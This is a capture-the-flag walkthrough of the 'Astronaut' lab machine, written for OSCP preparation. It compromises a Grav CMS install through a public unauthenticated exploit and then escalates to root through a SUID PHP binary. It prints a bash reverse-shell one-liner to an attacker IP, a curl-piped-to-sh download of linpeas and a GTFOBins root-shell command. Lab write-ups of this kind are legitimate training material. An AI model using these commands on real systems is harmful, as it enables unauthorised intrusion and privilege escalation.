# Recon
![info-comm](./info-comm.png)
This machine has a Linux OS and is rated intermediate by the community.

Remember to make an entry for the IP in `/etc/hosts` file. My entry looks like:
```
192.168.188.12  astronaut.offsec
```
## Nmap
``` bash
nmap -p- --open -sC -sV astronaut.offsec
```
- `-p-`: Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports.
- `--open`: Displays only open ports, indicating which services are active and accessible.
- `-sC`: Performs default script scanning, which runs a set of scripts to gather additional information about the target.
- `-sV`: Enables version detection, providing information about the versions of services running on open ports.
![nmap](./nmap.png)

The nmap scan discovered a volume with `grav-admin` folder.
- Browsing to this folder in the browser `http://astronaut.offsec/grav-admin/` shows a default installation page

## Gobuster
``` bash
gobuster dir -u astronaut.offsec/grav-admin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```
![gobuster](./gobuster.png)
The gobuster scan found an admin panel at `/admin/` and many other endpoints.

## Searchsploit
As the website is built with grav, we can search for known exploits using searchsploit.
``` bash
searchsploit grav
``` 
![searchsploit](./searchsploit.png)
I  like to look at python scripts first, so the first script I will look at is the Arbitrary YAML Write/Update script as that one is **unauthenticated**.

### Arbitrary YAML Write/Update
First, download the unauthenticated script by using `searchsploit -m php/webapps/49973.py`
- looking at the code, we can see that the target is set to a variable
- change this target to `http://astronaut.offsec/grav-admin`
  - this is because the URL `http://astronaut.offsec` only has a directory named grav-admin, so we must specify that directory for the exploit
- the script says to run the following command and replace the output with the base64 encoded value in the script
![scriptChange](./scriptChange.png)

For the command, you will need to replace the IP and port to the listening host (Kali IP and Port)
- I will be using the command `nc -lnvp 4444` to start a listener on my kali host with IP `192.168.45.220`
- So, the command I will run is `echo -ne "bash -i >& /dev/tcp/192.168.45.220/4444 0>&1" | base64 -w0`
- then, replace the contents in the designated `base64_decode()` function

Start a netcat listener and run the script using `python3 49973.py`
- after a couple seconds, a shell is generated with the user

# Privilege Escalation
## Manual commands
``` bash
find / -type f -perm -4001 -exec ls -la {} \; 2> /dev/null
```

### Explanation:
`find / -type f -perm -4001`:
find: Initiates the find command for searching files and directories.
`/`: Specifies the starting directory for the search (root directory in this case).
`-type f`: Specifies that only files (not directories) should be considered in the search.
`-perm -4001`: Searches for files with the SUID bit set. The SUID bit, when set, allows a file to be executed with the permissions of its owner.

`-exec ls -la {} \;`:
`-exec`: Executes a command for each matched file. The command is
  `ls -la {}`: Uses the `ls` command to list information about the found files. The `-la` option is used to make a list showing all files and details.
  `{}`: is replaced by the matched file for each iteration.
  `\;`: Marks the end of the -exec command.

`2> /dev/null`:
`2>`: Redirects standard error (stderr) to a specified location.
`/dev/null`: A special file in Unix-like operating systems that discards any data written to it.

## Linpeas
To assess the attack surface further, run `linpeas.sh` on the target:
- run a python http server in the directory with the `linpeas.sh` file with `python3 -m http.server 80`
- then use the `curl` command with `sh` to run the script on the target machine
- the IP specified is downloading from my Kali host
``` bash
curl http://192.168.45.220/linpeas.sh | sh
```

### Linpeas Results
The linpeas results showed php7.4 binary file in the directory `/usr/bin/php7.4` that has an unknown SUID binary. The output is shown below
```
-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)
```

We can confirm these findings with the manual enumeration commands we used. We did indeed find a php7.4 file.
- Using this information we can try to find privilege escalation for PHP SUID in [GTFOBins](https://gtfobins.github.io/gtfobins/php/)

GTFOBins uses the following command, the previous parts can be ignored as we know the version number of php.
``` bash
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

In order for this command to fit our context, we would change the running script to 
``` bash
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```
- the flag is located in the `/root` folder

# Summary
The "Astronaut" box in Proving Grounds Practice involves a comprehensive penetration testing approach. 
Initial reconnaissance using Nmap uncovers a Grav CMS installation with potential vulnerabilities. 
Gobuster identifies an admin panel, while Searchsploit yields an unauthenticated YAML Write/Update script which needs to be adapted. 
Manual enumeration reveals files with the SUID bit set, further explored with LinPEAS, confirming an unknown SUID binary, `/usr/bin/php7.4`. 
Exploiting this binary using GTFOBins facilitates privilege escalation, granting access to the /root folder where the flag is found. 
This walkthrough provides practical insights into various stages of a penetration test, offering a valuable learning experience for OSCP preparation.
